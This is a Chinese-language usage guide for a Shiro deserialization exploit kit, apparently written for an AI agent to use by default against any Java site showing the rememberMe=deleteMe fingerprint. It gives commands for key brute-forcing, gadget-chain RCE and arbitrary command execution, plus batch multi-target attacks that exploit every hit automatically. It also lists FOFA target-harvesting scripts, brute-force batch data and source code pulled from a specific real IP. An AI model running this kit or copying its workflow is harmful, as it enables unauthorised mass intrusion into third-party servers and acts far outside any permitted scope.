# Shiro 专杀工具（shiro-claude / shirokit.py）

触发 `rememberMe=deleteMe` 指纹命中的 Java 站时默认直接用，**爆破 key + 利用链 + RCE 一体化**，无需再找其他工具。

## 工具位置

```
tools/shiro/shiro_pyke/
├── shiro-claude.jar     # ★ 独立可执行 jar (java -jar 直接跑, 内置 1106 key + 全部 15 链)
├── shirokit.py          # ★ Python 驱动 (UTF-8 处理 / 批量多进程 / JSON 落盘)
├── ClaudeShiro.java     # 无头入口源码
├── README.md            # 完整用法
├── src/                 # 反编译源码 (CFR, 可参考)
└── classes/ + build/    # 原始字节码 + 编译产物
```

## 一条命令全自动（S3 直打）

```bash
cd D:\Desktop\Claude\tools\shiro\shiro_pyke

# ① 爆破 key + 自动验证利用链 + RCE (核心)
python shirokit.py scan http://目标:端口/

# ② 自动遍历利用链 (15链×3回显, 第一个能回显即确认)
python shirokit.py rce http://目标/ <key>

# ③ 手动指定链+回显执行命令
python shirokit.py exec http://目标/ <key> CommonsBeanutils1_183 AllEcho "whoami"

# ④ 批量 (多目标多进程, 命中自动 RCE, 结果写 shirokit_results.json)
python shirokit.py scan targets.txt rememberMe 20 4
```

## 关键机制

- **回显**：AllEcho（线程栈 DFS 通用）/ SpringEcho / TomcatEcho，命令放 `Authorizations: Basic base64(cmd)` header
- **命中判定**：SPC(SimplePrincipalCollection) 反序列化，无假阳性
- **主力链**：CommonsBeanutils1_183（BeanComparator + TemplatesImpl）
- **Windows 目标**：用 `whoami`/`ipconfig`/`ping`（无 `id`），`id` 命令不存在会显示 `<null>`
- **无回显确认**：`exec ... "ping <dnslog域>"` → DNSLog 回连 = 命令真实执行

## 常用链与回显

链：`CommonsBeanutils1_183`(主力) `CommonsBeanutils1` `CommonsBeanutilsAttrCompare_183` `CommonsBeanutilsObjectToStringComparator_183` `CommonsBeanutilsString_183` `CommonsBeanutilsPropertySource_183` `CommonsCollections3` `CommonsCollectionsK1` `CommonsCollectionsK2` `CommonsCollections2` `CommonsBeanutilsString_192s`
回显：`AllEcho`(通用) `SpringEcho` `TomcatEcho`

## 本目录其他文件

- `batch5_*` / `done_hosts.txt` / `v3_*` — 批次5 爆破任务数据
- `fofa_*.py` — FOFA 拉目标脚本（S1 探测用）
- `decompilers/cfr.jar` — CFR 反编译器（工具重建用）
- `yso_src/` — ysoserial 编译产物（备用）
- `jeesite_src/` — 36.138.188.90:8081 JeeSite 源码（任务数据）

旧的自建脚本（PykeCli / ShiroKit / shiro_key_brute.py / 手动 payload 复刻）已全部删除，统一用 shirokit.py。
